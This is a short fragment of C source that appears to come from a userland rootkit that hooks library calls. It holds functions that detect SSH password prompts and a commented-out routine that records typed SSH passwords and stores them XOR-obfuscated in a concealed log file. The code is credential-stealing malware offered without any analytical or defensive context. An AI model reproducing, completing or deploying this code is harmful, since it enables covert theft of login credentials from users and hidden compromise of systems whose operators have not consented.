static int is_pwprompt(int fd, const void *buf){
	struct stat s_fstat;
	hook(C__FXSTAT);
	memset(&s_fstat, 0, sizeof(stat));
	call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
	if(S_ISSOCK(s_fstat.st_mode))
		return 0;
	if(buf != NULL && strstr((char *)buf, "assword"))
		return 1;
	return 0;
}

static ssize_t hijack_write_ssh(int fd, const void *buf, ssize_t o){
	if(!process("ssh"))
		return o;
	if(is_pwprompt(fd, buf)){
		ssh_pass_size = 0;
		memset(ssh_pass, 0, sizeof(ssh_pass));
		ssh_start = 1;
	}
	return o;
}

static ssize_t log_ssh(int fd, void *buf, ssize_t o){
	if(fd == 0)
		return o;
	struct stat s_fstat;
	char *p, output[128];
	FILE *fp;
	hook(C__FXSTAT, CFOPEN);
	memset(&s_fstat, 0, sizeof(stat));
	call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
	if(S_ISSOCK(s_fstat.st_mode))
		return o;
	process("ssh");
/*	if(process("ssh") && fd == 4 && ssh_start){
		p = buf;
		if(*p == '\n'){
			ssh_start = 0;
			if((fp = xfopen(LDSO_LOGS, "a")) != NULL){
				sprintf(output, "%s:%s", process_cmdline(), ssh_pass);
				xor(t_o, output);
				fprintf(fp, "%s\n", t_o);
				clean(t_o);
				fflush(fp);
                                fclose(fp);
                        }
			return o;
		}
		ssh_pass[ssh_pass_size++] = *p;
	}
*/
	return o;
}
